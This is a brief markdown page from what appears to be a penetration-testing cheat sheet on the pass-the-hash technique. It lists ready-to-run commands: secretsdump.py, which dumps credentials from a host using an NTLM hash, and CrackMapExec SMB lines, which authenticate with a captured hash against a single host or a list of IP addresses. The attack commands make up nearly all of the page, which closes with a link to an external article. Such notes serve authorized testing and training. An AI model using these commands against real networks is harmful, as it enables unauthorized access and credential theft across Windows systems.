---
title : "Pass-the-hash"
# pre : ' '
description : "Use the hash of a user to authenticate around the network."
date : 2020-07-08T09:50:00+02:00
# hidden : true
# draft : true
weight : 60
# tags : ['']
---

---

Use the hash of a user to authenticate around the network.

### Secretsdump.py

```plain
secretsdump.py offsec/Taskscheduler -hashes 4aed682cfe9b5ccf87903c166d11d7afMZWA 10.10.10.10
```

### CrackmapExec

```plain
cme smb 10.10.10.10 -u johndo -H 8db8440e2ae574cc606de9d7be466820
cme smb ip-list.txt -u johndo -H 8db8440e2ae574cc606de9d7be466820
```

[En.hackndo.com - Pass-The-Hash](https://en.hackndo.com/pass-the-hash/)
